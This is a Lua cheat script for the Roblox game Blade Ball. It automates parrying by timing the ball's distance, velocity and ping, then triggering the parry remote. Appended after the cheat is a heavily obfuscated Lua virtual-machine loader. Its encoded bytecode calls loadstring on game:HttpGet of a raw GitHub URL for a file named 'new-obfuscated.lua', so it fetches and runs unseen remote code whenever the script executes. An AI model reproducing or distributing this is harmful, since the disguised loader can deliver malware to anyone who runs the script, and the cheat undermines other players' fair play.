shared.config = {
   adjustment = 3.7, -- // Keep this between 3 to 4 \\ --
   hit_range = 0.5, -- // You can mess around with this \\ --

   mode = 'Hold', -- // Hold , Toggle , Always \\ --
   deflect_type = 'Remote', -- // Key Press , Remote \\ --
   notifications = true,
   keybind = Enum.KeyCode.E
}

if getgenv().executed then return end

local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = game:GetService("Players").LocalPlayer
local Balls = game:GetService("Workspace").Balls

local IsTargeted = false
local CanHit = false

function FindBall()
    local RealBall

    for i, v in pairs(Balls:GetChildren()) do
        if v:GetAttribute("realBall") == true then
            RealBall = v
        end
    end
    return RealBall
end
  
function IsTarget()
    local Ball = FindBall()
    
	
    if Ball and Ball:GetAttribute("target") == LocalPlayer.Name then
        return true
    end
    return false
end

function DetectBall()
    local Ball = FindBall()
    
  	if Ball then
        local BallVelocity = Ball.Velocity.Magnitude
        local BallPosition = Ball.Position
  
        local PlayerPosition = LocalPlayer.Character.HumanoidRootPart.Position
  
        local Distance = (BallPosition - PlayerPosition).Magnitude
        local PingAccountability = BallVelocity * (game.Stats.Network.ServerStatsItem["Data Ping"]:GetValue() / 1000)
  
        Distance -= PingAccountability
        Distance -= shared.config.adjustment
  
        local Hit = Distance / BallVelocity
  
        if Hit <= shared.config.hit_range then
            return true
        end
    end
    return false
end

function DeflectBall()
    if IsTargeted and DetectBall() then
        if shared.config.deflect_type == 'Key Press' then
            keypress(0x46)
        else
            ReplicatedStorage.Remotes.ParryButtonPress:Fire()
        end
    end
end

UserInputService.InputBegan:Connect(function(Input, IsTyping)
    if IsTyping then return end
    if shared.config.mode == 'Toggle' and Input.KeyCode == shared.config.keybind then
      CanHit = not CanHit
        if shared.config.notifications then
            game:GetService("StarterGui"):SetCore("SendNotification",{
                Title = "Blade Ball",
                Text = CanHit and 'Enabled!' or 'Disabled!',
            })
        end
    elseif shared.config.mode == 'Hold' and Input.KeyCode == shared.config.keybind and shared.config.notifications then
        game:GetService("StarterGui"):SetCore("SendNotification",{
            Title = "Blade Ball",
            Text = 'Holding keybind!',
        })
    end
end)

UserInputService.InputEnded:Connect(function(Input, IsTyping)
    if IsTyping then return end
    if shared.config.mode == 'Hold' and Input.KeyCode == shared.config.keybind and shared.config.notifications then
        game:GetService("StarterGui"):SetCore("SendNotification",{
            Title = "Blade Ball",
            Text = 'No longer holding keybind!',
        })
    end
end)

game:GetService('RunService').PostSimulation:Connect(function()
    IsTargeted = IsTarget()

    if shared.config.mode == 'Hold' and UserInputService:IsKeyDown(shared.config.keybind) then
        DeflectBall()
    elseif shared.config.mode == 'Toggle' and CanHit then
        DeflectBall()
    elseif shared.config.mode == 'Always' then
        DeflectBall()
    end
end)

getgenv().executed = true
local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v68=v2(v0(v30,16));if v19 then local v77=v5(v68,v19);v19=nil;return v77;else return v68;end end end);local function v20(v31,v32,v33)if v33 then local v69=0 + 0 + 0 ;local v70;while true do if (v69==(0 + 0)) then v70=(v31/((5 -3)^(v32-(1638 -(1523 + 114)))))%((5 -3)^(((v33-(1 -0)) -(v32-(2 -1))) + (620 -(555 + 64)))) ;return v70-(v70%(932 -((1814 -(892 + 65)) + 74))) ;end end else local v71=(570 -(367 + 201))^(v32-(118 -(32 + 85))) ;return (((v31%(v71 + v71))>=v71) and (928 -(214 + 713))) or (0 + 0) ;end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35=0 -0 ;local v36;local v37;while true do if (v35==(1 -0)) then return (v37 * (188 + 68)) + v36 ;end if (v35==(0 -0)) then v36,v37=v1(v16,v18,v18 + (3 -1) );v18=v18 + (352 -((234 -147) + 263)) ;v35=953 -(802 + 150) ;end end end local function v23()local v38,v39,v40,v41=v1(v16,v18,v18 + 3 );v18=v18 + (6 -2) ;return (v41 * 16777216) + (v40 * (47703 + 17833)) + (v39 * (1253 -(915 + 82))) + v38 ;end local function v24()local v42=0 -0 ;local v43;local v44;local v45;local v46;local v47;local v48;while true do if (v42==(2 + 1)) then if (v47==(0 -0)) then if (v46==(1187 -(1069 + 118))) then return v48 * (0 -0) ;else v47=(3 -2) -0 ;v45=0;end elseif (v47==(356 + 1691)) then return ((v46==(0 -0)) and (v48 * ((1 + (0 -0))/((1650 -(814 + 45)) -(368 + (1042 -619)))))) or (v48 * NaN) ;end return v8(v48,v47-(3214 -2191) ) * (v45 + (v46/(2^(70 -(10 + 8))))) ;end if (v42==(0 -0)) then v43=v23();v44=v23();v42=443 -(416 + 26) ;end if (v42==(6 -4)) then v47=v20(v44,10 + 11 ,54 -23 );v48=((v20(v44,470 -(8 + 137 + 293) )==1) and  -(431 -(44 + 386))) or (1487 -(998 + 488)) ;v42=1 + 2 ;end if (v42==(1 + 0 + 0)) then v45=773 -((1086 -(261 + 624)) + 571) ;v46=(v20(v44,1139 -(116 + 1022) ,35 -15 ) * ((8 -6)^(19 + 13))) + v43 ;v42=2;end end end local function v25(v49)local v50=1080 -(1020 + 60) ;local v51;local v52;while true do if (v50==(1426 -(630 + 7 + 786))) then return v6(v52);end if (v50==(6 -4)) then v52={};for v78=4 -3 , #v51 do v52[v78]=v2(v1(v3(v51,v78,v78)));end v50=2 + 1 ;end if (v50==(0 -0)) then v51=nil;if  not v49 then local v95=1747 -(760 + 987) ;while true do if (v95==(1913 -(1789 + 98 + 26))) then v49=v23();if (v49==(766 -(745 + (1076 -(87 + 968))))) then return "";end break;end end end v50=1 + 0 ;end if (v50==1) then v51=v3(v16,v18,(v18 + v49) -(2 -1) );v18=v18 + v49 ;v50=7 -5 ;end end end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v53=0 + 0 ;local v54;local v55;local v56;local v57;local v58;local v59;local v60;while true do if ((4 -2)==v53) then v58=nil;v59=nil;v53=3;end if (v53~=1) then else local v72=0;while true do if (v72~=(1251 -(721 + 530))) then else v56=nil;v57=nil;v72=1;end if (v72~=(1272 -(945 + 326))) then else v53=4 -2 ;break;end end end if (v53~=(3 + 0)) then else v60=nil;while true do local v80=700 -(271 + 429) ;while true do if (v80~=1) then else if (0~=v54) then else local v104=0 + 0 ;local v105;while true do if ((1500 -(1408 + 92))==v104) then v105=1086 -(461 + 625) ;while true do if (v105~=(1288 -(993 + 295))) then else local v155=0 + 0 ;while true do if (v155==1) then v105=1172 -(418 + 753) ;break;end if (v155==(0 + 0)) then v55={};v56={};v155=1 + 0 ;end end end if (v105~=(1 + 0)) then else v57={};v58={v55,v56,nil,v57};v105=531 -(406 + 123) ;end if (v105~=2) then else v54=1770 -(1749 + 20) ;break;end end break;end end end break;end if (v80==0) then local v99=0;while true do if (0==v99) then if (v54~=1) then else local v123=0;while true do if (2~=v123) then else v54=1 + 1 ;break;end if (v123==(1323 -(1249 + 73))) then for v159=1,v59 do local v160=0;local v161;local v162;local v163;local v164;while true do if ((1 + 0)~=v160) then else v163=nil;v164=nil;v160=2;end if (v160~=0) then else v161=0;v162=nil;v160=1146 -(466 + 679) ;end if (v160~=(4 -2)) then else while true do if (v161~=(0 -0)) then else local v180=1900 -(106 + 1794) ;while true do if ((0 + 0)~=v180) then else v162=0 + 0 ;v163=nil;v180=2 -1 ;end if (v180~=1) then else v161=2 -1 ;break;end end end if (v161~=(115 -(4 + 110))) then else v164=nil;while true do if (v162~=1) then else if (v163==1) then v164=v21()~=0 ;elseif (v163==2) then v164=v24();elseif (v163~=(587 -(57 + 527))) then else v164=v25();end v60[v159]=v164;break;end if ((1427 -(41 + 1386))==v162) then local v182=103 -(17 + 86) ;local v183;local v184;while true do if (v182==(1 + 0)) then while true do if (v183~=(0 -0)) then else v184=0;while true do if (v184==0) then local v192=0 -0 ;local v193;while true do if (v192~=0) then else v193=166 -(122 + 44) ;while true do if (v193~=(1 -0)) then else v184=1;break;end if ((0 -0)==v193) then local v201=0;while true do if (v201==1) then v193=1;break;end if (v201==(0 + 0)) then v163=v21();v164=nil;v201=1 + 0 ;end end end end break;end end end if (v184~=1) then else v162=1;break;end end break;end end break;end if ((0 -0)~=v182) then else v183=0;v184=nil;v182=66 -(30 + 35) ;end end end end break;end end break;end end end v58[3]=v21();v123=2 + 0 ;end if (v123~=0) then else v59=v23();v60={};v123=1;end end end if (v54~=(1259 -(1043 + 214))) then else local v124=0 -0 ;while true do if (v124==1) then return v58;end if (v124~=0) then else for v165=1213 -(323 + 889) ,v23() do local v166=0;local v167;local v168;local v169;while true do if (1==v166) then v169=nil;while true do if (v167~=(0 -0)) then else v168=580 -(361 + 219) ;v169=nil;v167=1;end if (v167~=1) then else while true do if (v168==(320 -(53 + 267))) then v169=v21();if (v20(v169,1,1 + 0 )==0) then local v185=413 -(15 + 398) ;local v186;local v187;local v188;local v189;local v190;local v191;while true do if (v185~=0) then else v186=982 -(18 + 964) ;v187=nil;v185=3 -2 ;end if (v185==(1 + 0)) then v188=nil;v189=nil;v185=2;end if (v185~=3) then else while true do if (v186==1) then v189=nil;v190=nil;v186=2;end if (v186~=2) then else v191=nil;while true do if (v187~=(1 + 0)) then else v190=nil;v191=nil;v187=2;end if (v187~=2) then else while true do if ((850 -(20 + 830))==v188) then local v196=0 + 0 ;local v197;while true do if (v196==(126 -(116 + 10))) then v197=0;while true do if (v197~=1) then else v188=1 + 0 ;break;end if (v197~=(738 -(542 + 196))) then else v189=v20(v169,2,6 -3 );v190=v20(v169,4,2 + 4 );v197=1 + 0 ;end end break;end end end if (2==v188) then local v198=0 + 0 ;while true do if (v198~=1) then else v188=7 -4 ;break;end if (v198~=(0 -0)) then else local v204=0;local v205;while true do if (v204==(1551 -(1126 + 425))) then v205=405 -(118 + 287) ;while true do if (v205==1) then v198=3 -2 ;break;end if (v205==0) then if (v20(v190,1,1122 -(118 + 1003) )==(2 -1)) then v191[2]=v60[v191[2]];end if (v20(v190,2,379 -(142 + 235) )~=1) then else v191[13 -10 ]=v60[v191[1 + 2 ]];end v205=1;end end break;end end end end end if (v188==(980 -(553 + 424))) then if (v20(v190,5 -2 ,3)~=(1 + 0)) then else v191[4 + 0 ]=v60[v191[3 + 1 ]];end v55[v165]=v191;break;end if (v188~=1) then else local v200=0 + 0 ;while true do if (v200==(0 + 0)) then local v206=0 -0 ;while true do if (v206==1) then v200=1;break;end if (v206~=(0 -0)) then else local v207=0;while true do if (v207==(0 -0)) then v191={v22(),v22(),nil,nil};if (v189==(0 -0)) then local v212=753 -(239 + 514) ;local v213;local v214;while true do if (v212==1) then while true do if (v213~=(0 + 0)) then else v214=1329 -(797 + 532) ;while true do if (v214~=0) then else v191[3]=v22();v191[3 + 1 ]=v22();break;end end break;end end break;end if (v212==0) then v213=0;v214=nil;v212=1 + 0 ;end end elseif (v189==1) then v191[6 -3 ]=v23();elseif (v189==2) then v191[3]=v23() -((1204 -(373 + 829))^16) ;elseif (v189==3) then local v217=0;local v218;while true do if (v217==0) then v218=0;while true do if (v218==(731 -(476 + 255))) then v191[3]=v23() -((1132 -(369 + 761))^16) ;v191[4]=v22();break;end end break;end end end v207=1;end if (v207==1) then v206=1 + 0 ;break;end end end end end if (v200~=(1 -0)) then else v188=3 -1 ;break;end end end end break;end if (v187==(238 -(64 + 174))) then local v194=0;local v195;while true do if (0~=v194) then else v195=0 + 0 ;while true do if (0~=v195) then else v188=0 -0 ;v189=nil;v195=1;end if (v195~=(337 -(144 + 192))) then else v187=217 -(42 + 174) ;break;end end break;end end end end break;end if (v186~=(0 + 0)) then else v187=0;v188=nil;v186=1 + 0 ;end end break;end if (v185==(1 + 1)) then v190=nil;v191=nil;v185=3;end end end break;end end break;end end break;end if (v166==(1504 -(363 + 1141))) then v167=0;v168=nil;v166=1581 -(1183 + 397) ;end end end for v170=1,v23() do v56[v170-1 ]=v28();end v124=2 -1 ;end end end v99=1 + 0 ;end if (v99==(1 + 0)) then v80=1;break;end end end end end break;end if (v53==0) then local v73=0;while true do if (v73==(1975 -(1913 + 62))) then v54=0 + 0 ;v55=nil;v73=1;end if (1~=v73) then else v53=2 -1 ;break;end end end end end local function v29(v61,v62,v63)local v64=0;local v65;local v66;local v67;while true do if (v64==1) then v67=v61[3];return function(...)local v81=v65;local v82=v66;local v83=v67;local v84=v27;local v85=1;local v86= -1;local v87={};local v88={...};local v89=v12("#",...) -1 ;local v90={};local v91={};for v96=0,v89 do if (v96>=v83) then v87[v96-v83 ]=v88[v96 + 1 ];else v91[v96]=v88[v96 + 1 ];end end local v92=(v89-v83) + 1 ;local v93;local v94;while true do v93=v81[v85];v94=v93[1];if (v94<=3) then if (v94<=1) then if (v94>0) then do return;end else local v106=v93[2];local v107,v108=v84(v91[v106](v13(v91,v106 + 1 ,v93[3])));v86=(v108 + v106) -1 ;local v109=0;for v125=v106,v86 do v109=v109 + 1 ;v91[v125]=v107[v109];end end elseif (v94>2) then local v110=0;local v111;local v112;local v113;local v114;local v115;while true do if (v110==4) then v91[v93[2]]=v93[3];v85=v85 + 1 ;v93=v81[v85];v115=v93[2];v110=5;end if (v110==8) then v93=v81[v85];do return;end break;end if (v110==0) then v111=nil;v112,v113=nil;v114=nil;v115=nil;v110=1;end if (v110==3) then v91[v115 + 1 ]=v114;v91[v115]=v114[v93[4]];v85=v85 + 1 ;v93=v81[v85];v110=4;end if (v110==6) then v85=v85 + 1 ;v93=v81[v85];v115=v93[2];v91[v115]=v91[v115](v13(v91,v115 + 1 ,v86));v110=7;end if (v110==1) then if ((v93[3]=="_ENV") or (v93[3]=="getfenv")) then v91[v93[2]]=v63;else v91[v93[2]]=v63[v93[3]];end v85=v85 + 1 ;v93=v81[v85];if ((v93[3]=="_ENV") or (v93[3]=="getfenv")) then v91[v93[2]]=v63;else v91[v93[2]]=v63[v93[3]];end v110=2;end if (v110==2) then v85=v85 + 1 ;v93=v81[v85];v115=v93[2];v114=v91[v93[3]];v110=3;end if (v110==5) then v112,v113=v84(v91[v115](v13(v91,v115 + 1 ,v93[3])));v86=(v113 + v115) -1 ;v111=0;for v157=v115,v86 do local v158=0;while true do if (v158==0) then v111=v111 + 1 ;v91[v157]=v112[v111];break;end end end v110=6;end if (v110==7) then v85=v85 + 1 ;v93=v81[v85];v91[v93[2]]();v85=v85 + 1 ;v110=8;end end else v91[v93[2]]();end elseif (v94<=5) then if (v94>4) then if ((v93[3]=="_ENV") or (v93[3]=="getfenv")) then v91[v93[2]]=v63;else v91[v93[2]]=v63[v93[3]];end else local v116=0;local v117;local v118;while true do if (0==v116) then v117=v93[2];v118=v91[v93[3]];v116=1;end if (1==v116) then v91[v117 + 1 ]=v118;v91[v117]=v118[v93[4]];break;end end end elseif (v94==6) then local v119=0;local v120;while true do if (0==v119) then v120=v93[2];v91[v120]=v91[v120](v13(v91,v120 + 1 ,v86));break;end end else v91[v93[2]]=v93[3];end v85=v85 + 1 ;end end;end if (v64==0) then v65=v61[1];v66=v61[2];v64=1;end end end return v29(v28(),{},v17)(...);end v15("LOL!043O00030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034E3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F73656B7274652O33342O352O342F526F626C6F782F6D61696E2F6E65772D6F6266757363617465642E6C756100083O0012033O00013O00122O000100023O00202O00010001000300122O000300046O000100039O0000026O000100016O00017O00",v9(),...);